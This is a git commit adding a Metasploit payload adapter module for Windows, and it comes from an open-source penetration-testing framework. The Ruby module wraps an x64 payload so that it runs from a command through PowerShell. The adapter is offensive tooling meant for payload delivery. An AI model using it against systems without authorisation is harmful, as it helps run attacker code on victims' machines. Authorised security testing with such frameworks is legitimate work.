eb03c9f1318448c8b1c999d4910b82012ac40ec8
Spencer McIntyre <zeroSteiner@gmail.com>
2022-05-05 16:31:28 -0400

    Add the powershell adapters

---
+++ modules/payloads/adapters/cmd/windows/powershell/x64.rb
@@ -0,0 +1,32 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+module MetasploitModule
+  include Msf::Payload::Adapter
+  include Msf::Exploit::Powershell
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Powershell Exec',
+        'Description' => 'Execute an x64 payload from a command via PowerShell',
+        'Author' => 'Spencer McIntyre',
+        'Platform' => 'win',
+        'Arch' => ARCH_CMD,
+        'License' => MSF_LICENSE,
+        'AdaptedArch' => ARCH_X64,
+        'AdaptedPlatform' => 'win',
+        'RequiredCmd' => 'powershell'
+      )
+    )
+  end
+
+  def generate
+    payload = super
+
+    cmd_psh_payload(payload, ARCH_X64, remove_comspec: true)
+  end
+end
